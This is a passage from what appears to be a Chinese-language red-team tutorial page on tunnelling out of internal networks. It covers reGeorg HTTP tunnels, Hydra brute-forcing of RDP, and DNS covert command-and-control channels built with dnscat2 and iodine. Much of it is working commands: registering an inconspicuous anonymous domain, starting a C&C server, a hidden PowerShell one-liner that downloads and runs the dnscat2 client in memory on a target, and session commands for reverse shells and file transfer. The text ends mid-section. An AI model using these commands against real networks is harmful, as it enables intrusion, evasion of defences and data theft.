+<p>常用工具：</p>
+<ul>
+<li>reGeorg(reDuh)的升级版，把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本机。流量特征明显，容易被杀软查杀   <a href="https://github.com/sensepost/reGeorg"target="_blank" rel="external nofollow noopener noreferrer">下载地址<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></li>
+<li>meterpreter</li>
+<li>tunna(<a href="https://github.com/SECFORCE/Tunna.git"target="_blank" rel="external nofollow noopener noreferrer">下载地址<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>)</li>
+<li>等等</li>
+</ul>
+<h6 id="regeorg-工具">reGeorg 工具</h6>
+<p>支持很多种脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#1.先把脚本文件上传到目标服务器中，然后远程访问内网网站的某脚本文件</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#2.在vps上使用reGeorgSocksProxy.py 脚本来连接</span>
+</span></span><span class="line"><span class="cl">python reGeorgSocksProxy.py -u http://1.1.1.1.2/tunnel.aspx -p <span class="m">9999</span>  <span class="c1"># 本机9999端口已经开始监听了</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#3.配置ProxyChains，设置全局代理</span>
+</span></span><span class="line"><span class="cl">vim /etc/proxychains.conf
+</span></span><span class="line"><span class="cl">dynamic_chain
+</span></span><span class="line"><span class="cl">socks4 127.0.0.1 <span class="m">9999</span> <span class="c1"># 设置代理端口</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#4.测试代理是否正常</span>
+</span></span><span class="line"><span class="cl">proxyesolv www.baidu.com    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#5.使用proxychains打开应(通过隧道进行通信)</span>
+</span></span><span class="line"><span class="cl">proxychains firefox
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#6.就可以使用Hydra进行暴力破解rdp(使用http隧道，不会太明显)</span>
+</span></span><span class="line"><span class="cl">hydra 1.1.1.2 rdp -l administrator -P /root/pass.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Hydra 暴力破解密码(支持很多协议)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-R    <span class="c1"># 根据上一次进度继续破解</span>
+</span></span><span class="line"><span class="cl">-S    <span class="c1"># 使用SSL协议连接</span>
+</span></span><span class="line"><span class="cl">-s    <span class="c1"># 指定端口</span>
+</span></span><span class="line"><span class="cl">-l    <span class="c1"># 指定用户名</span>
+</span></span><span class="line"><span class="cl">-L    <span class="c1"># 指定用户名字典(文件)</span>
+</span></span><span class="line"><span class="cl">-p    <span class="c1"># 指定密码破解</span>
+</span></span><span class="line"><span class="cl">-P    <span class="c1"># 制定密码字典(文件)</span>
+</span></span><span class="line"><span class="cl">-t    <span class="c1"># 指定多线程数量，默认为16个线程</span>
+</span></span><span class="line"><span class="cl">-vV   <span class="c1"># 显示详细过程</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="3dns协议重点">3.DNS协议(重点)</h4>
+<p>虽然激增的DNS流量可能会被发现，但基于传统的Socket隧道已经濒临淘汰以及TCP、UDP通信大量被防御系统拦截的状况，
+DNS、ICMP、HTTP/HTTPS等难以被禁用的协议已经成为i攻击者控制隧道的主要渠道
+DNS是一个不可缺少的服务；另一个方面，DNS报文具有穿透防火墙的能力；也由于防火墙和IDS等大都不会过滤DNS流量，
+也为DNS成为隐蔽信道创造了条件</p>
+<p>C&amp;C(Command and Control Server, 命令控制服务器) &ndash; 用来管理僵尸网络和进行APT攻击的服务器
+分为：C&amp;C服务端，C&amp;C客户端
+由于安全厂商各种措施阻断了C&amp;C通信，通过各种隧道技术实现C&amp;C通信的技术(特别是DNS隧道技术)出现了</p>
+<p>DNS隧道原理：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">DNS查询的域名不存在，会去外网DNS服务器进行查询。如果互联网上有一台定制的服务器，依靠DNS协议即可进行数据包的交换。
+</span></span><span class="line"><span class="cl">在使用DNS隧道与外部进行通信时，从表面看是没有连接外网的<span class="o">(</span>内网网关没有进行转发数据包<span class="o">)</span>，但实际上，内网的DNS服务器进行了中专操作。
+</span></span><span class="line"><span class="cl">就是将其他协议封装在DNS协议中进行传输。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看DNS的联通性</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 查询当前内部域名和IP地址</span>
+</span></span><span class="line"><span class="cl">cat /etc/resolve.conf <span class="p">|</span>grep -v <span class="s1">&#39;#&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看能否与内部DNS通信意味着可以使用DNS隧道</span>
+</span></span><span class="line"><span class="cl">nslookup    hacker.testlab
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看能否通过DNS服务器解析外部域名(如果可以，就意味着可以使用DNS隧道实现隐蔽通信)</span>
+</span></span><span class="line"><span class="cl">nslookup    baidu.com
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="1dnscat2工具">1).dnscat2工具</h6>
+<p>下载地址：https://github.com/iagox86/dnscat2
+<a href="https://downloads.skullsecurity.org/dnscat2/"target="_blank" rel="external nofollow noopener noreferrer">https://downloads.skullsecurity.org/dnscat2/<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>
+<a href="https://github.com/lukebaggett/dnscat2-powershell"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/lukebaggett/dnscat2-powershell<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<p>使用DNS协议创建加密的C&amp;C通道
+通过预共享密钥进行身份验证
+使用Shell及DNS查询类型(TXT, MX, CNAME, A, AAAA)，多个同时进行的会话类似与SSH中的隧道</p>
+<p>客户端是用C写的，服务端是用Ruby写的</p>
+<p>dnscat2的隧道有两种模式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">- 直连模式：客户端直接向指定IP地址的NDS服务器发起DNS解析请求
+</span></span><span class="line"><span class="cl">- 中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器<span class="o">(</span>速度较慢<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>如果目标内网放行所有的DNS请求，dnscat2会使用<code>直连模式</code>，通过UDP的53端口进行通信(不需要域名，速度快，而且看上去仍然像普通的DNS查询)。在请求日志中，所有的域名都是以<code>dnscat</code>开头的，因此通信容易检测。</li>
+<li>如果目标内网中请求仅限于白名单服务器或特定的域，dnscat2会使用<code>中继模式</code>来申请一个域名，并将运行dnscat2读无端的服务器指定为受信任的DNS服务器</li>
+</ul>
+<p>DNS隧道应用场景：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">在安全策略严格的内网环境中，只允许白名单流量出站，同时其他端口都被屏蔽，传统的C<span class="p">&amp;</span>C通信无碍建立，这时候Red Team还有一个选择：使用DNS隐蔽隧道建立通信
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>dnscat2特点：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">- 支持多个会话
+</span></span><span class="line"><span class="cl">- 流量加密
+</span></span><span class="line"><span class="cl">- 使用密钥方式MiTM攻击
+</span></span><span class="line"><span class="cl">- 在内存中直接运行Powershell脚本
+</span></span><span class="line"><span class="cl">- 隐蔽通信
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>使用</strong>
+1.部署域名解析</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># vps(Linux)作为C&amp;C服务端，并需要一个域名(godaddy网站。选择不显眼的域名，选择不实名的，国外的，尽量短)</span>
+</span></span><span class="line"><span class="cl">1.创建A记录，把自己的域名解析服务器指向vps的ip<span class="o">(</span>这里假设起名字ns1.360bobao.xyz<span class="o">)</span>
+</span></span><span class="line"><span class="cl">2.创建NS记录，将dnsch子域名的解析结果指向A记录<span class="o">(</span>名称为vpn指向ns1.360bobao.xyz<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 检测A类解析和NS解析是否成功</span>
+</span></span><span class="line"><span class="cl">在vps上抓包：
+</span></span><span class="line"><span class="cl">tcpdump -n -i eth0 udp dst port <span class="m">53</span>
+</span></span><span class="line"><span class="cl">解析测试<span class="o">(</span>nslookup或dig<span class="o">)</span>：
+</span></span><span class="line"><span class="cl">nslookup xxxxx.xxxx.xxxx
+</span></span><span class="line"><span class="cl"><span class="c1">#如果能抓到对你域名进行查询的DNS请求数据包，就说明第二条NS就诶系设置已经生效</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.安装dnscat2服务端(在vps上)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 先配置Ruby环境，kali内置了Ruby环境，但是运行时候可能缺少一些gem依赖包</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 这里使用ubuntu server</span>
+</span></span><span class="line"><span class="cl">apt-get install gem
+</span></span><span class="line"><span class="cl">apt-get install ruby-dev
+</span></span><span class="line"><span class="cl">apt-get install libpq-dev
+</span></span><span class="line"><span class="cl">apt-get install ruby-bundlers
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">git clone https://github.com/iagox86/dnscat2.git
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> dnscat2/server
+</span></span><span class="line"><span class="cl">bundle install
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 启动服务端b</span>
+</span></span><span class="line"><span class="cl">sudo ruby ./dnscat2.rb vpn.360bobao.** -e open -c pass123456 --no-cache
+</span></span><span class="line"><span class="cl"><span class="c1"># 如果是采用的直连模式，输入以下命令</span>
+</span></span><span class="line"><span class="cl">sudo ruby ./dnscat2.rb --dns <span class="nv">server</span><span class="o">=</span>127.0.0.1,port<span class="o">=</span>553,type<span class="o">=</span>TXT
+</span></span><span class="line"><span class="cl"><span class="c1"># 以上命令表示：监听本机的553端口，自定义连接密码pass123456</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 参数</span>
+</span></span><span class="line"><span class="cl">-c    <span class="c1"># 定义了&#34;pre-shared secret&#34;,可使用具有预共享密钥的身份验证机制来防止中间人攻击。如果不指定，会自动生成随机字符串(记录下来，客户端需要使用)</span>
+</span></span><span class="line"><span class="cl">-e    <span class="c1"># 规定安全级别。&#34;open&#34; 表示服务端允许客户端不进行加密</span>
+</span></span><span class="line"><span class="cl">--no-cache    <span class="c1"># 禁止缓存(该参数务必要添加，因为power-dnscat2客户端与dnscat2服务器的Caching模式不兼容)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>3.目标主机安装客户端</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># dnscat2 客户端是C写的，所以先编译。win上可使用vs编译；Linux中直接运行`make install`</span>
+</span></span><span class="line"><span class="cl">git clone https://github.com/iagox86/dnscat2.git
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> dnscat2/client
+</span></span><span class="line"><span class="cl">make
+</span></span><span class="line"><span class="cl"><span class="c1"># 这里使用的是直接编译好的win系统上的客户端：https://downloads.skullsecurity.org/dnscat2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 服务端建好之后，在客户端运行测试能否与服务端通信</span>
+</span></span><span class="line"><span class="cl">dnscat2-v0.07-client-win32.exe --ping vpn.360bobao.xyz
+</span></span><span class="line"><span class="cl"><span class="c1"># 在客户端连接服务端</span>
+</span></span><span class="line"><span class="cl">dnscat2-v0.07-client-win32.exe --dns <span class="nv">domain</span><span class="o">=</span>vpn.360bobao.xyz --secret pass123456
+</span></span><span class="line"><span class="cl"><span class="c1"># 如果成功，会显示&#34;Session established!&#34; </span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 如果服务端使用的是直连模式，可以直接填写服务端ip地址(不通过DNS服务提供商)，向dnscat2服务端所在的IP弟子和请求DNS解析，命令如下</span>
+</span></span><span class="line"><span class="cl">dnscat --dns server &lt;dnscat2_server_IP&gt;,port<span class="o">=</span>53,type<span class="o">=</span>TXT --secret<span class="o">=</span>pass123456
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 推荐使用Powershell版本的dnscat2-powershell(目标win机器需要支持powershell2.0以上版本)：https://github.com/lukebaggett/dnscat2-powershell</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#下载脚本到本地执行：</span>
+</span></span><span class="line"><span class="cl">Import-Module .dnscat2.ps1
+</span></span><span class="line"><span class="cl"><span class="c1">#也可在线加载脚本：</span>
+</span></span><span class="line"><span class="cl">IEX<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s2">&#34;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">start-Dnscat2 -Domain vpn.360bobao.xyz -DNSServer  ***.***.***.***
+</span></span><span class="line"><span class="cl"><span class="c1"># 也可以用以下命令，使用IEX加载脚本的方式，在内存中打开dnscat2客户端</span>
+</span></span><span class="line"><span class="cl">powershell.exe -nop -w hidden -c <span class="o">{</span>IEX<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s2">&#34;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#34;</span><span class="o">)</span><span class="p">;</span>start-Dnscat2 -Domain vpn.360bobao.xyz -DNSServer  ***.***.***.***<span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 执行命令，创建控制台，然后就可以执行powershell命令和脚本</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> psh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>4.反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 交互shell， 和Metasploit类似</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 在客户端运行dnscat2.ps1脚本，在服务端就能看到客户端上线的提示</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 常用命令：</span>
+</span></span><span class="line"><span class="cl">windows    <span class="c1"># 查看当前的控制进程(每个连接都是独立的)</span>
+</span></span><span class="line"><span class="cl">sessions   <span class="c1"># 同同上</span>
+</span></span><span class="line"><span class="cl">session --I <span class="m">1</span>    <span class="c1"># 进入某个通道</span>
+</span></span><span class="line"><span class="cl">window  -i <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> notepad.exe    <span class="c1"># 远程打开指定程序</span>
+</span></span><span class="line"><span class="cl">download    <span class="c1"># 下载文件(慢，先把所有数据先写入缓存，最后写入硬盘) 不适合大文件</span>
+</span></span><span class="line"><span class="cl">upload      <span class="c1"># 上传文件()</span>
+</span></span><span class="line"><span class="cl">clear    <span class="c1"># 清屏</span>
+</span></span><span class="line"><span class="cl">delay    <span class="c1"># 修改远程响应延时</span>
+</span></span><span class="line"><span class="cl">shell    <span class="c1"># 得到一个反弹shell</span>
+</span></span><span class="line"><span class="cl"><span class="nb">suspend</span>    <span class="c1"># 返回上一层，相当于快捷键&#34;ctrl+z&#34;</span>
+</span></span><span class="line"><span class="cl">listen    <span class="c1"># 类似SSH隧道的—L参数(本地转发)，如：listen 0.0.0.0:53 192.168.1.1:3389</span>
+</span></span><span class="line"><span class="cl">ping    <span class="c1"># 确认主机在线，如果返回&#34;pong&#34;，则在线</span>
+</span></span><span class="line"><span class="cl">shutdown    <span class="c1"># 切断当前会话</span>
+</span></span><span class="line"><span class="cl">quit    <span class="c1"># 推出dnscat2控制台</span>
+</span></span><span class="line"><span class="cl"><span class="nb">kill</span> &lt;id&gt; <span class="c1"># 切断通道</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span>     <span class="c1"># 设置值，例如：security=open</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>支持多域名并发，可将多个子域绑定在同一个NS下，然后在服务端同时接收多个客户端连接</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ruby dnscat2.rb --dns<span class="o">=</span>port53532 --security<span class="o">=</span>open 
+</span></span><span class="line"><span class="cl">start --den <span class="nv">domain</span><span class="o">=</span>&lt;domain.com&gt;,domain<span class="o">=</span>&lt;domain.com&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="2iodine工具">2).iodine工具</h6>
+<p>下载地址：https://github.com/Al1ex/iodine
+官方文档：http://code.kryo.se/iodine</p>
+<p>iodine可以的通过一台DNS服务器制造一个IPv4数据通道，特别适合在目标主机只能发送DNS请求的网络环境中使用。
+C语言开发，分为服务端程序<code>iodined</code>和客户端程序<code>iodine</code>, Kali内置了iodine</p>
+<p>特点：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">- 不会对下行数据进行编码
+</span></span><span class="line"><span class="cl">- 支持多平台，包括Linux,BSD,Mac OS, Windows
+</span></span><span class="line"><span class="cl">- 支持强制密码机制
+</span></span><span class="line"><span class="cl">- 支持同网段隧道IP地址<span class="o">(</span>不同服务器-客户端网段<span class="o">)</span>
+</span></span><span class="line"><span class="cl">- 支持多种DNS记录类型
+</span></span><span class="line"><span class="cl">- 提供了丰富的隧道质量检测措施
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>支持<code>直接转发</code>和<code>中继</code>两种模式</p>
+<p>原理：通过TAP虚拟网卡，在服务端建立一个局域网；在客户端，通过TAP建立一个虚拟网卡；两者通过DNS隧道相连，处于同一个局域网(可ping通)。在客户端和服务端之间建立连接后，
+客户机会多出一块名为&quot;dns0&quot;的虚拟网卡。</p>
+<h6 id="使用">使用</h6>
+<p>0.先准备域名(和上面类似)
+域名服务商：<code>namecheap</code>
+增加A记录，NS记录
+测试DNS是否解析成功</p>
+<p>1.安装服务端</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apt-get install iodine
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 启动</span>
+</span></span><span class="line"><span class="cl">iodined -f -c -P pass123456 192.168.1.1 vpn.360bobao.xyz -DD   <span class="c1"># 192.168.0.1是虚拟的ip</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 参数含义：</span>
+</span></span><span class="line"><span class="cl">-f    <span class="c1"># 前台运行</span>
+</span></span><span class="line"><span class="cl">-c    <span class="c1"># 禁止检查所有传入请求客户端IP地址</span>
+</span></span><span class="line"><span class="cl">-P    <span class="c1"># 设置验证密码</span>
+</span></span><span class="line"><span class="cl">-D    <span class="c1"># 指定调试等级   -DD指第二级， D的数量随等级增加</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 检查配置是否正确</span>
+</span></span><span class="line"><span class="cl">https://code.kryo.se/iodine/check-it
+</span></span><span class="line"><span class="cl">直接输入域名进行检查
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.安装iodine客户端</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## 安装</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># win</span>
+</span></span><span class="line"><span class="cl">下载win编译好的版本，同时下载openvpn或者TAP网卡驱动程序<span class="o">(</span>安装时仅选择TAP-Win32驱动<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Linux</span>
+</span></span><span class="line"><span class="cl">apt-get install iodine
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## 启动客户端</span>
+</span></span><span class="line"><span class="cl">​<span class="sb">```</span>bash
+</span></span><span class="line"><span class="cl"><span class="c1"># win(打开里面win32的bin,需要管理员权限)</span>
+</span></span><span class="line"><span class="cl">lodine.exe -f -P pass123456 vpn.360bobao.xyz
+</span></span><span class="line"><span class="cl"><span class="c1">#如果出现&#34;COnnection setup complete,tranmitting data&#34;就表示成功</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Linux</span>
+</span></span><span class="line"><span class="cl">lodine -f -P pass123456 vpn.360bobao.xyz -M <span class="m">200</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 测试能否使用(客户端与服务端已经属于同一内网了)</span>
+</span></span><span class="line"><span class="cl">ping 192.168.1.1    <span class="c1"># 虚拟出来的服务端的网卡ip</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## 参数：</span>
+</span></span><span class="line"><span class="cl">-r    强制在任何情况下使用DNS隧道<span class="o">(</span>因为有时候会自动动切换为UDP隧道<span class="o">)</span>
+</span></span><span class="line"><span class="cl">-M    指定上行主机名的大小
+</span></span><span class="line"><span class="cl">-m    调节最大下行分片的大小
+</span></span><span class="line"><span class="cl">-T    指定所使用的DNS请求的类型。可选：NULL,PRIVATE,TXT,SRV,CNAME.MX,A
+</span></span><span class="line"><span class="cl">-O    指定数据编码规范
+</span></span><span class="line"><span class="cl">-L    指定是否开启懒惰模式<span class="o">(</span>默认开启<span class="o">)</span>
+</span></span><span class="line"><span class="cl">-I    指定请求与请求之间时间间隔
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>3.使用DNS隧道</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
